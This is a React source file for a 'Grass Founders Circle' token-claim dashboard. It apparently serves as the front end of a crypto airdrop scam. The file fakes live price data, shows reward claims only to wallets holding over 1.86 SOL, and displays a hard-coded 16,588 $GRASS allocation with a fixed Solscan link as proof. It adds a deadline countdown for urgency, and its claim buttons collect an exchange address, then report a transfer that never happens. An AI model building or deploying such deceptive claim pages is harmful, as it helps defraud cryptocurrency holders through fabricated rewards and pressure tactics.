import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { motion, AnimatePresence } from "framer-motion";
import { GrassLogo } from "@/components/ui/grass-logo";
import { useToast } from "@/hooks/use-toast";

// Types
type Metric = {
  price: string;
  change24h: string;
  marketCap: string;
  volume: string;
};

// Components
function MetricCard({ label, value, isLive = false }: { label: string; value: string; isLive?: boolean }) {
  return (
    <div className="mb-3 last:mb-0 text-white">
      <div className="text-xs text-white/60 uppercase mb-1 flex items-center">
        {label}
        {isLive && (
          <span className="inline-block w-2 h-2 bg-[#00ff00] rounded-full ml-1.5 animate-pulse" />
        )}
      </div>
      <div className="text-lg font-semibold text-[#9dff00] font-mono">{value}</div>
    </div>
  );
}

function CountdownItem({ value, label }: { value: number; label: string }) {
  return (
    <div className="glass-panel p-5 rounded-[10px] min-w-[80px] flex flex-col items-center">
      <div className="text-4xl font-bold text-[#9dff00] text-shadow-glow font-mono">
        {value.toString().padStart(2, '0')}
      </div>
      <div className="text-xs text-white/60 uppercase mt-1.5">{label}</div>
    </div>
  );
}

export default function Dashboard() {
  const [, setLocation] = useLocation();
  const { toast } = useToast();
  const [metrics, setMetrics] = useState<Metric>({
    price: "$0.3159",
    change24h: "+4.10%",
    marketCap: "$147M",
    volume: "$30.87M",
  });
  
  const [timeLeft, setTimeLeft] = useState({
    days: 0,
    hours: 0,
    minutes: 0,
    seconds: 0,
  });

  const [walletAddress, setWalletAddress] = useState("");
  const [isVerifying, setIsVerifying] = useState(false);
  const [walletBalance, setWalletBalance] = useState<number | null>(null);
  const [showClaimSection, setShowClaimSection] = useState(false);
  const [showCexModal, setShowCexModal] = useState(false);
  const [cexAddress, setCexAddress] = useState("");

  const MIN_REQUIRED_BALANCE = 1.86342;

  // Fetch Metrics
  useEffect(() => {
    // Simulated fetch with real baseline data
    const fetchMetrics = () => {
       const basePrice = 0.3159;
       const randomVariation = (Math.random() - 0.5) * 0.005;
       const price = (basePrice + randomVariation).toFixed(4);
       
       setMetrics({
         price: `$${price}`,
         change24h: "+4.10%",
         marketCap: "$147M",
         volume: "$30.87M",
       });
    };

    fetchMetrics();
    const interval = setInterval(fetchMetrics, 5000);
    return () => clearInterval(interval);
  }, []);

  // Countdown Timer
  useEffect(() => {
    const targetDate = new Date('2025-12-22T21:37:00+08:00').getTime();

    const updateCountdown = () => {
      const now = new Date().getTime();
      const distance = targetDate - now;

      if (distance < 0) {
        setTimeLeft({ days: 0, hours: 0, minutes: 0, seconds: 0 });
        return;
      }

      setTimeLeft({
        days: Math.floor(distance / (1000 * 60 * 60 * 24)),
        hours: Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60)),
        minutes: Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60)),
        seconds: Math.floor((distance % (1000 * 60)) / 1000),
      });
    };

    const interval = setInterval(updateCountdown, 1000);
    updateCountdown();
    return () => clearInterval(interval);
  }, []);

  const handleWalletSubmit = async () => {
    if (!walletAddress) {
      toast({
        title: "Error",
        description: "Please enter a wallet address",
        variant: "destructive",
      });
      return;
    }

    setIsVerifying(true);
    setWalletBalance(null);

    try {
      // Real Solana Mainnet RPC call
      const response = await fetch("https://api.mainnet-beta.solana.com", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          jsonrpc: "2.0",
          id: 1,
          method: "getBalance",
          params: [walletAddress]
        }),
      });

      const data = await response.json();

      if (data.error) {
        throw new Error(data.error.message || "Invalid wallet address");
      }

      // Convert lamports to SOL (1 SOL = 1,000,000,000 lamports)
      const lamports = data.result?.value || 0;
      const balance = lamports / 1000000000;
      
      setWalletBalance(balance);

      if (balance > MIN_REQUIRED_BALANCE) {
        setShowClaimSection(true);
        toast({
          title: "Wallet Verified",
          description: `Balance: ${balance.toFixed(4)} SOL. Eligibility confirmed.`,
          className: "border-[#9dff00] text-[#9dff00] bg-black/90",
        });
      } else {
        setShowClaimSection(false);
        toast({
          title: "Insufficient Balance",
          description: `Wallet balance (${balance.toFixed(4)} SOL) is below the required ${MIN_REQUIRED_BALANCE} SOL.`,
          variant: "destructive",
        });
      }
    } catch (error) {
      console.error("Verification error:", error);
      toast({
        title: "Verification Failed",
        description: "Could not verify wallet. Please check the address and try again.",
        variant: "destructive",
      });
    } finally {
      setIsVerifying(false);
    }
  };

  const handleClaim = () => {
    setShowCexModal(true);
  };

  const handleCexSubmit = () => {
     if (!cexAddress) return;
     
     setShowCexModal(false);
     toast({
       title: "✅ Sending to CEX",
       description: "Your $GRASS tokens are being processed. Please check your wallet in 1-5 days.",
       className: "border-[#9dff00] text-[#9dff00] bg-black/90",
     });
  };

  return (
    <div className="relative z-10 min-h-screen p-6 pb-20">
      <div className="max-w-[1200px] mx-auto">
        {/* Header */}
        <header className="flex flex-col md:flex-row justify-between items-center mb-12 gap-6">
          <div className="flex items-center gap-4">
            <GrassLogo className="w-[60px] h-auto drop-shadow-[0_0_15px_rgba(157,255,0,0.5)]" />
            <div>
              <h1 className="text-[#9dff00] text-3xl font-bold text-shadow-glow">Grass</h1>
              <div className="text-[rgba(157,255,0,0.7)] text-sm -mt-1 tracking-[2px] font-medium">FOUNDERS CIRCLE</div>
            </div>
          </div>

          <div className="glass-panel p-6 rounded-[15px] w-full md:w-auto min-w-[200px]">
            <MetricCard label="Price (USD)" value={metrics.price} isLive />
            <MetricCard label="24h Change" value={metrics.change24h} />
            <MetricCard label="Market Cap" value={metrics.marketCap} />
            <MetricCard label="Volume (24h)" value={metrics.volume} />
          </div>
        </header>

        <div className="max-w-[800px] mx-auto">
          {/* Wallet Section */}
          <motion.div 
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            className="glass-panel p-10 rounded-[20px] mb-8"
          >
            <h2 className="text-[#9dff00] text-2xl mb-6 text-shadow-glow font-semibold">Connect Your Wallet</h2>
            <div className="mb-6">
              <label className="block text-white mb-2 text-sm">Wallet Address</label>
              <div className="relative">
                <input 
                  type="text" 
                  placeholder="Enter your wallet address"
                  value={walletAddress}
                  onChange={(e) => setWalletAddress(e.target.value)}
                  disabled={isVerifying || showClaimSection}
                  className="w-full px-4 py-3 bg-white/10 border border-[#9dff00]/30 rounded-lg text-white font-mono text-sm focus:outline-none focus:border-[#9dff00] focus:shadow-[0_0_15px_rgba(157,255,0,0.3)] transition-all duration-300 disabled:opacity-50"
                />
                {isVerifying && (
                  <div className="absolute right-3 top-3">
                     <div className="w-5 h-5 border-2 border-[#9dff00] border-t-transparent rounded-full animate-spin" />
                  </div>
                )}
              </div>
              {walletBalance !== null && (
                 <div className={`mt-3 text-sm flex items-center gap-2 ${walletBalance > MIN_REQUIRED_BALANCE ? 'text-[#9dff00]' : 'text-red-400'}`}>
                    <div className={`w-2 h-2 rounded-full ${walletBalance > MIN_REQUIRED_BALANCE ? 'bg-[#9dff00]' : 'bg-red-400'}`} />
                    Balance: {walletBalance} SOL {walletBalance < MIN_REQUIRED_BALANCE && `(Minimum ${MIN_REQUIRED_BALANCE} SOL required)`}
                 </div>
              )}
            </div>
            {!showClaimSection && (
                <motion.button 
                whileHover={{ scale: 1.02, translateY: -2 }}
                whileTap={{ scale: 0.98 }}
                onClick={handleWalletSubmit}
                disabled={isVerifying}
                className="w-full py-3.5 bg-gradient-to-br from-[#9dff00] to-[#7cd600] rounded-lg text-[#0a0e27] font-semibold text-base shadow-[0_5px_20px_rgba(157,255,0,0.3)] hover:shadow-[0_8px_30px_rgba(157,255,0,0.5)] transition-all duration-300 disabled:opacity-70 disabled:cursor-not-allowed"
                >
                {isVerifying ? "Verifying Balance..." : "Verify Wallet Eligibility"}
                </motion.button>
            )}
          </motion.div>

          {/* Claim Section */}
          <AnimatePresence>
            {showClaimSection && (
              <motion.div 
                initial={{ opacity: 0, height: 0 }}
                animate={{ opacity: 1, height: "auto" }}
                exit={{ opacity: 0, height: 0 }}
                className="glass-panel p-10 rounded-[20px] mb-8 overflow-hidden"
              >
                <h2 className="text-[#9dff00] text-2xl mb-6 text-shadow-glow font-semibold">Claim Your Rewards</h2>
                
                <div className="bg-black/30 p-4 rounded-[10px] text-white break-all mb-6 border border-[#9dff00]/10 font-mono text-sm">
                  {walletAddress}
                </div>

                <div className="bg-[#9dff00]/10 p-6 rounded-[10px] border-2 border-[#9dff00]/30 mb-8 text-center">
                  <div className="text-[#9dff00] text-lg font-semibold mb-4 text-shadow-glow">Track the release of your $Grass</div>
                  <a 
                    href="https://solscan.io/tx/48YpMxYyzdKmFNzNSTqiUh4jF8WD2ZaBkr17jQ2bx2mfLGnzwB3PqfQjmPuRQb8mRvTNLG1YknNczVFXcimwhaVk" 
                    target="_blank" 
                    rel="noreferrer"
                    className="block bg-black/30 p-4 rounded-lg break-all text-[#9dff00] text-xs md:text-sm mb-4 border border-[#9dff00]/20 hover:bg-[#9dff00]/10 hover:border-[#9dff00]/40 transition-all duration-300"
                  >
                    https://solscan.io/tx/48YpMxYyzdKmFNzNSTqiUh4jF8WD2ZaBkr17jQ2bx2mfLGnzwB3PqfQjmPuRQb8mRvTNLG1YknNczVFXcimwhaVk
                  </a>
                  <div className="text-white/80 text-sm leading-relaxed">
                    Your treasury link is active. Click above to track your $Grass transaction on Solscan.
                  </div>
                </div>

                <div className="bg-[#9dff00]/10 p-6 rounded-[10px] border border-[#9dff00]/30 mb-8 text-center">
                  <div className="text-4xl md:text-5xl font-bold text-[#9dff00] text-shadow-glow mb-3">16,588 $GRASS</div>
                  <div className="text-white/80 text-sm">Hashed and blocked - Ready to claim</div>
                </div>

                <div className="text-center mb-8">
                  <div className="text-white/70 text-xs uppercase tracking-[2px] mb-4">Latest Time Possible for Claiming</div>
                  <div className="flex justify-center gap-3 md:gap-5 mb-6">
                    <CountdownItem value={timeLeft.days} label="Days" />
                    <CountdownItem value={timeLeft.hours} label="Hours" />
                    <CountdownItem value={timeLeft.minutes} label="Minutes" />
                    <CountdownItem value={timeLeft.seconds} label="Seconds" />
                  </div>
                  <div className="text-white/60 text-xs leading-relaxed max-w-[500px] mx-auto">
                    This countdown represents the latest time possible to claim your $Grass founder rewards. Please always check this site to ensure you claim your rewards before the deadline expires.
                  </div>
                </div>

                <motion.button 
                  whileHover={{ scale: 1.02, translateY: -2 }}
                  whileTap={{ scale: 0.98 }}
                  onClick={handleClaim}
                  className="w-full py-4 bg-gradient-to-br from-[#9dff00] to-[#7cd600] rounded-lg text-[#0a0e27] font-semibold text-lg shadow-[0_5px_20px_rgba(157,255,0,0.3)] hover:shadow-[0_8px_30px_rgba(157,255,0,0.5)] transition-all duration-300 mb-4"
                >
                  Claim Rewards
                </motion.button>
                
                <motion.button 
                  whileHover={{ scale: 1.02, translateY: -2 }}
                  whileTap={{ scale: 0.98 }}
                  onClick={handleClaim}
                  className="w-full py-4 bg-gradient-to-br from-[#ffd700] to-[#ffed4e] rounded-lg text-[#0a0e27] font-semibold text-lg shadow-[0_5px_20px_rgba(255,215,0,0.3)] hover:shadow-[0_8px_30px_rgba(255,215,0,0.5)] transition-all duration-300"
                >
                  🎁 Claim Bonus: 1000 $GRASS
                </motion.button>
              </motion.div>
            )}
          </AnimatePresence>
        </div>

        <motion.button 
          whileHover={{ scale: 1.1 }}
          whileTap={{ scale: 0.9 }}
          onClick={() => setLocation("/")}
          className="fixed bottom-8 right-8 px-6 py-3 bg-white/10 border border-[#9dff00]/30 rounded-xl text-[#9dff00] backdrop-blur-md z-50 hover:bg-[#9dff00]/20 transition-all duration-300"
        >
          Logout
        </motion.button>
      </div>

      {/* CEX Modal */}
      <AnimatePresence>
        {showCexModal && (
          <div className="fixed inset-0 z-[2000] flex items-center justify-center bg-black/80 backdrop-blur-sm p-4">
            <motion.div 
              initial={{ opacity: 0, scale: 0.9 }}
              animate={{ opacity: 1, scale: 1 }}
              exit={{ opacity: 0, scale: 0.9 }}
              className="bg-[#0a0e27]/95 border-2 border-[#9dff00]/30 rounded-[20px] p-10 max-w-[500px] w-full shadow-[0_20px_60px_rgba(0,0,0,0.5)]"
            >
              <h2 className="text-[#9dff00] text-2xl mb-6 text-center text-shadow-glow font-bold">Block Found! 🎉</h2>
              <p className="text-white text-base text-center mb-8 leading-relaxed">
                Please enter your CEX wallet address to receive your $GRASS tokens.
              </p>
              
              <div className="mb-8">
                <label className="block text-white mb-2 text-sm">CEX Wallet Address</label>
                <input 
                  type="text" 
                  placeholder="Enter your CEX wallet address"
                  value={cexAddress}
                  onChange={(e) => setCexAddress(e.target.value)}
                  className="w-full px-4 py-3 bg-white/10 border border-[#9dff00]/30 rounded-lg text-white font-mono text-sm focus:outline-none focus:border-[#9dff00] focus:shadow-[0_0_15px_rgba(157,255,0,0.3)] transition-all duration-300"
                />
              </div>

              <div className="flex gap-4">
                 <button 
                  onClick={() => setShowCexModal(false)}
                  className="flex-1 py-3 bg-white/10 text-white rounded-lg hover:bg-white/20 transition-all"
                >
                  Cancel
                </button>
                <button 
                  onClick={handleCexSubmit}
                  className="flex-1 py-3 bg-gradient-to-br from-[#9dff00] to-[#7cd600] text-[#0a0e27] font-semibold rounded-lg hover:shadow-[0_0_20px_rgba(157,255,0,0.4)] transition-all"
                >
                  Confirm & Send
                </button>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>
    </div>
  );
}
